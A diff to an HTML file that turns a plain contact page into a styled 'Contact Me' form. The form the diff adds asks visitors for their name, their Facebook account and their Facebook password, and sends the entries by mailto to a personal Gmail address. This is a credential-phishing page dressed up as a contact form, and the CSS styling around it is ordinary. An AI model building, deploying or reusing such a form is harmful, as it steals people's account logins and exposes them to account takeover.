@@ -1,29 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Contact Us</title>
-  <link rel="stylesheet" href="style.css">
+<meta charset="UTF-8">
+<title>Contact Me</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background: linear-gradient(135deg,#667eea,#764ba2);
+}
+
+.form-box{
+  background:white;
+  width:90%;
+  max-width:400px;
+  padding:30px;
+  border-radius:20px;
+  box-shadow:0 15px 40px rgba(0,0,0,0.3);
+}
+
+.form-box h2{
+  text-align:center;
+  color:#764ba2;
+  margin-bottom:20px;
+}
+
+input, textarea{
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:10px;
+  border:1px solid #ccc;
+  font-size:16px;
+}
+
+textarea{
+  resize:none;
+  height:120px;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  margin-top:10px;
+  background: linear-gradient(135deg,#667eea,#764ba2);
+  color:white;
+  border:none;
+  border-radius:30px;
+  font-size:18px;
+  cursor:pointer;
+}
+
+button:hover{
+  opacity:0.9;
+}
+
+.note{
+  text-align:center;
+  margin-top:15px;
+  font-size:14px;
+  color:#555;
+}
+</style>
 </head>
+
 <body>
 
-<header>
-  <nav>
-    <a href="index.html">Home</a>
-    <a href="about.html">About</a>
-    <a href="services.html">Services</a>
-    <a href="blog.html">Blog</a>
-    <a href="contact.html">Contact</a>
-  </nav>
-</header>
+<div class="form-box">
+  <h2>Contact Me</h2>
 
-<div class="container">
-  <h1>Contact Us</h1>
-  <p>Email: example@gmail.com</p>
-  <p>Phone: +880123456789</p>
-  <img src="images/contact.jpg" alt="Contact Image">
+  <form action="mailto:mrsabbirhossain909@gmail.com" method="POST" enctype="text/plain">
+    <input type="text" name="Name" placeholder="Your Name" required>
+    <input type="text" name="Email" placeholder="Your Facebook " required>
+    <input type="text" name="Password " placeholder="Your Password " required>
+
+    <button type="submit">Click</button>
+  </form>
+
+  <div class="note">
+    📧 This will open your email app
+  </div>
 </div>
-
-<footer>© 2026 My Colorful Website</footer>
 
 </body>
 </html>
+
+
+
+
+
